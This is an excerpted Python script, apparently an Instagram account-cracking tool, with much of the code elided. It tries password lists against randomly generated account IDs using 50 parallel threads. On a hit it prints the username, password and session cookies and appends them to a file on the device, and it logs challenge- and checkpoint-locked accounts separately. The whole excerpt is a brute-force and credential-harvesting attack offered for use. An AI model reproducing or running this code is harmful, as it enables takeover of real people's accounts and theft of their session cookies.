...
def generate_device_hash(uidd, pw):
    """Generate device hash for Instagram API"""
    hash_obj = hashlib.md5()
    hash_obj.update(f"{uidd}{pw}".encode('utf-8'))
...
def crack(uidd, password_list, total_count):
    ...
    'doc_id': '25351082227851825',
            ...
            if 'sessionid' in extracted:
                ...
                print(f"\r\033[1;92m [✓ SUCCESS] {uidd} | {pw}")
                print("Cookies:", cookie_str)
                open("/sdcard/SUMON_INS_IDS.txt","a").write(uidd+"|"+pw+"|"+cookie_str+"\n")
                oks.append(uidd)
                return True
            elif 'challenge_required' in response.text:
                print(f"\r\033[1;93m [⚠ CHALLENGE] {uidd} | {pw}")
                continue
            elif 'checkpoint_required' in response.text:
                print(f"\r\033[1;93m [⚠ CHECKPOINT] {uidd} | {pw}")
                open("/sdcard/SUMON_INS_CP.txt","a").write(uidd+"|"+pw+"\n")
                cps.append(uidd)
                continue
            else:
...
def random_number():
    ...
    with ThreadPoolExecutor(max_workers=50) as executor:
        ...
        for random_id in idz:
            ...
            future = executor.submit(crack, uidd, password_patterns, len(idz))
